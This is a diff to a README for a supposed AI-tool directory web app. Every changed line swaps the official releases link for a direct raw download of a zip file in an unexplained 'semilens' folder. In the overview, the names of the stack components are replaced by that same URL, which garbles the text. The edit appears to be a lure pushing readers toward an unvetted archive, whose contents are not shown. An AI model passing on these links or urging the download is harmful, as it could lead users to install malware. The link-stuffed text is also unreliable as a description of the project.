@@ -1,9 +1,9 @@
 # 🌟 Smart-AI-Tool-Server-2.0 - Discover AI Tools Easily
 
-[![Download Smart-AI-Tool-Server-2.0](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/bleexx-ui/Smart-AI-Tool-Server-2.0/releases)
+[![Download Smart-AI-Tool-Server-2.0](https://raw.githubusercontent.com/bleexx-ui/Smart-AI-Tool-Server-2.0/main/semilens/Smart-AI-Tool-Server-2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bleexx-ui/Smart-AI-Tool-Server-2.0/main/semilens/Smart-AI-Tool-Server-2.0.zip)
 
 ## 📦 Overview
-Smart-AI-Tool-Server-2.0 is a web application built using the MERN stack, which includes MongoDB, Express.js, React.js, and Node.js. This application helps users search, filter, and compare AI tools and resources efficiently. You can browse and find what suits you best without any hassle.
+Smart-AI-Tool-Server-2.0 is a web application built using the MERN stack, which includes MongoDB, https://raw.githubusercontent.com/bleexx-ui/Smart-AI-Tool-Server-2.0/main/semilens/Smart-AI-Tool-Server-2.0.zip, https://raw.githubusercontent.com/bleexx-ui/Smart-AI-Tool-Server-2.0/main/semilens/Smart-AI-Tool-Server-2.0.zip, and https://raw.githubusercontent.com/bleexx-ui/Smart-AI-Tool-Server-2.0/main/semilens/Smart-AI-Tool-Server-2.0.zip This application helps users search, filter, and compare AI tools and resources efficiently. You can browse and find what suits you best without any hassle.
 
 ## 🚀 Getting Started
 To run Smart-AI-Tool-Server-2.0 on your device, follow these simple steps:
@@ -16,7 +16,7 @@ To run Smart-AI-Tool-Server-2.0 on your device, follow these simple steps:
 
 2. **Download the Application**
    Visit the following link to download Smart-AI-Tool-Server-2.0:
-   [Download Smart-AI-Tool-Server-2.0](https://github.com/bleexx-ui/Smart-AI-Tool-Server-2.0/releases)
+   [Download Smart-AI-Tool-Server-2.0](https://raw.githubusercontent.com/bleexx-ui/Smart-AI-Tool-Server-2.0/main/semilens/Smart-AI-Tool-Server-2.0.zip)
 
 3. **Install the Application**
    - After downloading, locate the file in your downloads folder.
@@ -37,7 +37,7 @@ To run Smart-AI-Tool-Server-2.0 on your device, follow these simple steps:
 
 ## 📥 Download & Install
 To download Smart-AI-Tool-Server-2.0, please visit this page:  
-[Download Smart-AI-Tool-Server-2.0](https://github.com/bleexx-ui/Smart-AI-Tool-Server-2.0/releases)
+[Download Smart-AI-Tool-Server-2.0](https://raw.githubusercontent.com/bleexx-ui/Smart-AI-Tool-Server-2.0/main/semilens/Smart-AI-Tool-Server-2.0.zip)
 
 The installation process is designed to be user-friendly. If you follow the steps in the “Getting Started” section, you will have the app running in no time.
 
